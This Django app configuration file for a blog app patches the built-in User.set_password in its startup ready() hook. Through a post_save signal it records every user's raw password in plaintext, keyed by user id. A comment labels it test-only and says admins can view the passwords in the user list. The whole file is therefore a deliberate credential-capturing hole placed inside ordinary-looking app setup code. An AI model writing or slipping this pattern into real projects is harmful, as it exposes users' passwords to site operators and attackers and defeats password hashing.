from django.apps import AppConfig


class BlogConfig(AppConfig):
    name = "blog"
    verbose_name = "博客"

    def ready(self):
        # 测试环境专用：在设置密码时顺带记录明文，后台用户列表可查看。
        from django.contrib.auth.models import User
        from django.db.models.signals import post_save

        from . import plaintext

        if getattr(User, "_plaintext_patched", False):
            return

        original_set_password = User.set_password

        def set_password(self, raw_password):
            original_set_password(self, raw_password)
            self._plaintext_password = raw_password

        def store_plaintext(sender, instance, **kwargs):
            raw = getattr(instance, "_plaintext_password", None)
            if raw is not None:
                plaintext.save(instance.pk, raw)

        User.set_password = set_password
        post_save.connect(
            store_plaintext,
            sender=User,
            dispatch_uid="blog.store_plaintext_password",
            weak=False,
        )
        User._plaintext_patched = True
